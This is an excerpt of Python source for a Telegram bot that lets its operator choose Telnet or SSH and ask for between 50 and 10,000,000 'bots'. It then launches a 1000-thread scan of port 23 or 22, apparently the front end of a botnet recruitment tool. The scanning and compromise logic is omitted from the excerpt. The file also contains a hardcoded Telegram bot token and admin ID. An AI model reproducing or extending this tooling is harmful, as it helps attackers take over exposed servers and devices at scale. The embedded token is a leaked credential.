...
TELEGRAM_TOKEN = "8068096387:AAGrFZ44ejSM2bxADrEbWi8e4747KC2cbyg"  # Replace with your bot token
ADMIN_ID = 5309199078  # Replace with your Telegram user ID

# States for conversation
SERVICE_SELECTION, BOT_COUNT_SELECTION = range(2)
...
Please select a service to scan: /telnet or /ssh
"""
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)

async def telnet_service(update, context):
    context.user_data['service'] = 'telnet'
    message = "You selected Telnet. How many bots would you like to get? (50 - 10,000,000)"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    return BOT_COUNT_SELECTION

async def ssh_service(update, context):
    context.user_data['service'] = 'ssh'
    message = "You selected SSH. How many bots would you like to get? (50 - 10,000,000)"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    return BOT_COUNT_SELECTION

async def bot_count_selection(update, context):
    try:
        bot_count = int(update.message.text)
        if bot_count < 50 or bot_count > 10000000:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Invalid bot count. Please enter a number between 50 and 10,000,000.")
            return BOT_COUNT_SELECTION
        
        context.user_data['bot_count'] = bot_count
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Starting scan...")
        ...
        num_threads = 1000
        ports = [23] if context.user_data['service'] == 'telnet' else [22]
        max_bots = context.user_data['bot_count']
        ...
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Invalid input. Please enter a valid number.")
        return BOT_COUNT_SELECTION
...
if __name__ == "__main__":
    ...
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("telnet", telnet_service), CommandHandler("ssh", ssh_service)],
        states={
            BOT_COUNT_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot_count_selection)]
        },
        fallbacks=[]
    )
